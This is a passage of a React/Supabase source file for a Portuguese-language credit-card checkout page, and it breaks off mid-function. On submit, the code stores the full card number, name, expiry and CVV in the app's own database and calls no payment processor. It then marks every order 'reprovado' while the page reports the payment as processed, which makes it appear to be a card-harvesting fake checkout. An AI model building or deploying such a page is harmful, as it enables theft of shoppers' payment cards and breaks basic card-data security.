import { useState, useEffect } from 'react';
import { useParams, useNavigate, useLocation } from 'react-router-dom';
import { useQueryClient } from '@tanstack/react-query';
import { toast } from 'sonner';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { ArrowLeft } from 'lucide-react';
import CreditCardForm, { CreditCardFormValues } from '@/components/payment/CreditCardForm';
import { supabase } from '@/integrations/supabase/client';
import ProductSummary from '@/components/payment/ProductSummary';
import { createPaymentInfo } from '@/services/paymentInfoService';
import { atualizarStatusPedido } from '@/services/pedidoService';

export default function CartaoPage() {
  const { slug } = useParams<{ slug: string }>();
  const navigate = useNavigate();
  const location = useLocation();
  const queryClient = useQueryClient();
  const [produto, setProduto] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [pedidoData, setPedidoData] = useState<any>(null);

  const searchParams = new URLSearchParams(location.search);
  let pedidoId = searchParams.get('pedidoId');

  useEffect(() => {
    async function fetchData() {
      console.log('Iniciando fetchData - slug:', slug, 'pedidoId:', pedidoId);
      if (!slug) {
        setError('Produto não especificado');
        setLoading(false);
        return;
      }

      try {
        const { data: produtoData, error: produtoError } = await supabase
          .from('produtos')
          .select('*')
          .eq('slug', slug)
          .maybeSingle();

        if (produtoError) throw new Error('Erro ao carregar produto');
        if (!produtoData) throw new Error('Produto não encontrado');

        console.log('Produto encontrado:', produtoData);
        setProduto(produtoData);

        if (!pedidoId) {
          console.log('Nenhum pedidoId encontrado, criando novo pedido...');
          const { data: novoPedido, error: pedidoError } = await supabase
            .from('pedidos')
            .insert({ produto_id: produtoData.id, status: 'pendente', valor: produtoData.preco })
            .select()
            .single();

          if (pedidoError) throw new Error('Erro ao criar pedido');
          pedidoId = novoPedido.id;
          console.log('Novo pedido criado com ID:', pedidoId);
          setPedidoData(novoPedido);
          // Não redireciona mais, apenas atualiza o pedidoId
          window.history.pushState({}, '', `/cartao/${slug}?pedidoId=${pedidoId}`);
        } else {
          const { data: pedido, error: pedidoError } = await supabase
            .from('pedidos')
            .select('*')
            .eq('id', pedidoId)
            .maybeSingle();

          if (pedidoError) throw new Error('Erro ao carregar pedido');
          if (!pedido) throw new Error('Pedido não encontrado');

          console.log('Pedido encontrado:', pedido);
          setPedidoData(pedido);
        }
      } catch (error: any) {
        console.error('Erro em fetchData:', error.message);
        setError(error.message);
      } finally {
        setLoading(false);
      }
    }

    fetchData();
  }, [slug, navigate]);

  const handleSubmit = async (data: CreditCardFormValues) => {
    console.log('handleSubmit chamado com dados:', { ...data, cvv: '***' });
    console.log('Pedido ID atual:', pedidoId);

    if (!pedidoId) {
      toast.error('ID do pedido não encontrado');
      setSubmitting(false);
      return;
    }

    setSubmitting(true);

    try {
      console.log('1. Salvando informações de pagamento...');
      await createPaymentInfo({
        pedido_id: pedidoId,
        metodo_pagamento: 'cartao',
        numero_cartao: data.numero_cartao,
        nome_cartao: data.nome_cartao,
        validade: data.validade,
        cvv: data.cvv,
        parcelas: parseInt(data.parcelas.split('x')[0], 10),
      });
      console.log('2. Informações de pagamento salvas');

      console.log('3. Atualizando status do pedido...');
      const success = await atualizarStatusPedido(pedidoId, 'reprovado');
      if (!success) throw new Error('Falha ao atualizar status');

      console.log('4. Status atualizado para "reprovado"');
      toast.info('Pagamento processado, redirecionando...');

      queryClient.invalidateQueries({ queryKey: ['pedidos'] });
      console.log('5. Cache invalidado');
